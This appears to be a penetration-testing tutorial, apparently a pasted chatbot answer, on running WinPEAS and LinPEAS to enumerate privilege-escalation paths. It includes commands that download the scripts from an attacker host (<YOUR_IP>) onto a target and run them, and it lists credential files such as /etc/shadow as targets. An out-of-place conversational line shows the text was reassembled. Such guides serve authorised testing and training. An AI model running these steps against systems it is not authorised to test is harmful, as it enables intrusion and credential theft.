Using WinPEAS (Windows Privilege Escalation Awesome Script)
1. Running WinPEAS on a Windows Target

    Transfer WinPEAS to the Target Machine: If WinPEAS is not already on the target system, you’ll need to transfer it using methods such as:
        PowerShell (Invoke-WebRequest or Invoke-Expression)
        SMB (File Sharing)
        Manual Copy (USB, shared folder)

    Example using PowerShell:

Invoke-WebRequest -Uri "http://<YOUR_IP>/winPEASx64.exe" -OutFile "C:\Windows\Temp\winPEASx64.exe"

Run WinPEAS on the Target:

    Open a Command Prompt or PowerShell on the target machine.
    Navigate to the directory where winPEASx64.exe was saved (e.g., C:\Windows\Temp\).
    Run the following command:

C:\Windows\Temp\winPEASx64.exe

    Optional Flags:
        -a: Runs all checks (default).
        -fast: Runs a faster set of checks.
        -h: Displays help for all options.

For example, to run all checks, you can execute:

    C:\Windows\Temp\winPEASx64.exe -a

Review the Output:

    WinPEAS will scan the system and display results in the terminal.
    Key things to look for:
        Weak permissions: Misconfigured file or folder permissions (e.g., writable SYSTEM files).
        Sensitive information: Passwords or keys stored in the registry or files.
        Misconfigured services: Services running with elevated privileges that can be hijacked.
        Installed software: Outdated or vulnerable versions that could be exploited for PrivEsc.

Using LinPEAS (Linux Privilege Escalation Awesome Script)
1. Running LinPEAS on a Linux Target

    Transfer LinPEAS to the Target Machine: If LinPEAS isn’t already on the target system, transfer it using SCP or download it over HTTP.

    Example using wget:

wget http://<YOUR_IP>:8080/linpeas.sh

    Alternatively, you can use SCP to copy the script to the target system.

Make the Script Executable: Before running LinPEAS, ensure the script is executable.

chmod +x linpeas.sh

Run LinPEAS on the Target:

    Execute the script in the terminal:

    ./linpeas.sh

    Optional Flags:
        -q: Quiet mode (runs basic checks only).
        -h: Displays help for all options.
        -t: Shows a more thorough output (increased verbosity).

Example to run with quiet mode:

./linpeas.sh -q

Review the Output:

    LinPEAS will scan the system for potential privilege escalation vectors.
    Key things to look for:
        SUID/SGID binaries: Binaries that have escalated privileges due to incorrect configurations.
        Writable files: Files or directories in system paths that should not be writable by regular users.
        Kernel vulnerabilities: Known vulnerabilities related to the kernel version.
        Scheduled tasks: Cron jobs that may be misconfigured and exploitable.
        Sensitive files: Files containing passwords or secrets (e.g., /etc/shadow, /etc/passwd).


Great! Now that you have WinPEAS and LinPEAS installed, here's how you can use each of them for privilege escalation (PrivEsc) testing on Windows and Linux systems.

General Tips for Using WinPEAS and LinPEAS

    Check for Key PrivEsc Vectors: Both WinPEAS and LinPEAS will highlight common and critical vectors for privilege escalation. Pay attention to:
        Misconfigured file and directory permissions (write access to sensitive files).
        Outdated software that might have known exploits.
        Exposed credentials in configuration files or environment variables.

    Use the Tools Together: WinPEAS and LinPEAS can be complementary, especially in cases where you’re performing cross-platform assessments or need to confirm findings on both Windows and Linux systems.

    Document Findings: Both tools produce a lot of output. Take note of the results that seem to present a viable escalation path and document them for later exploitation or reporting.

    Combine with Manual Checks: While WinPEAS and LinPEAS automate many checks, always complement these tools with manual techniques for privilege escalation. Sometimes, subtle misconfigurations might not be flagged by automated tools.
